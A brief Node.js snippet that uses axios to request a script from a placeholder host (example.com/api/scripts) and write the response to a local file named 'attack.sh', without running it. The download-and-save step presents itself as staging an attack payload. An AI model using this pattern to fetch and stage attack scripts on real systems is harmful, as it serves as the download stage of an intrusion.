const axios = require('axios');
const fs = require('fs');
const instance = axios.create({
  baseURL: 'https://example.com/api/',
  timeout: 1000,
  headers: {'X-Custom-Header': 'foobar'}
});
instance.get('/scripts?ID=12345')
  .then(function (response) {
    fs.writeFileSync('attack.sh', response.data)
    console.log(response);
  })
  .catch(function (error) {
    // handle error
    console.log(error);
  })
  .finally(function () {
    // always executed
  });
